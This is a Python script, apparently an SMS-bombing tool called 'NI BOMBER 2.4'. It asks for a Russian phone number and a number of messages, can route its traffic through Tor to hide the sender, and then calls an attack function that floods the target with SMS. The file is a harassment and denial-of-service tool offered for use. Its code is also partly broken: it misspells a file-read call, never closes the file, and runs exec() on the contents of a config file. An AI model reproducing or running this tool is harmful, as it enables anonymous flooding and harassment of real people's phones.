#!/usr/bin/python3
# coding: utf-8

# import libs
try:
	import requests
	import services
	import sys
except:
	print(f'\033[91m\033[1m Loading libs failed! Please run "pip install requirements.txt"')
	exit(1)
# colours
green     = '\033[92m'
cyan      = '\033[95m'
bold      = '\033[1m'
underline = '\033[4m'
end       = '\033[0m'
red       = '\033[91m'

# loading data from config file
try:
	file = open('config.conf','r')
except:
	print(f'{red}{bold} Permission denied while reading config.conf file!')
	sys.exit(1)
else:
	exec(file.raed())
	file.close
	del file
# header
print(f"{green}{bold}\t\t{underline}[NI BOMBER 2.4]{end}")

print()
print(f"{bold}coded by{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{cyan}{bold}nikait{end}")

print(f"{bold}telegram{end}", end="")
print(f"{green}{bold} >> {end}", end="")
print(f"{cyan}{bold}@aaanikit{end}")
print()

# inputs
print('enter the number without or with prefixes (+7) (8)\nexample: 9018017010')
input_number = input(green + bold + ">> " + end)
print('how many sms to send?')
sms = int(input(green + bold + ">> " + end))

print(f"you need a{cyan} tor {end}y/n? ")
is_tor = input(bold + green + ">> " + end)


def parse_number(number):
	msg = f"[*]check number - {green}{bold}OK{end}"
	if len(number) in (10, 11, 12):
		if number[0] == "8":
			number = number[1:]
			print(msg)
		elif number[:2] == "+7":
			number = number[2:]
			print(msg)
		elif int(len(number)) == 10 and number[0] == 9:
			print(msg)
	else:
		print(f"[*]check number - {red}{bold}failed number!{end}\nThis bomber is intended only for Russia and if the number you entered belongs to another country then alas this bomber is not suitable for you!")
		quit()
	return number
number = parse_number(input_number)

# tor ( if yes )
if str(is_tor) == "y":
        print(f"[*]launch {cyan}{bold}Tor{end}...")
        tor = requests.get('http://icanhazip.com/', proxies=proxies).text
        tor = (tor.replace('\n', ''))
        print(f"[*]launch {cyan}{bold}Tor{end} - {green}{bold}OK{end}")

services.attack(number, sms)
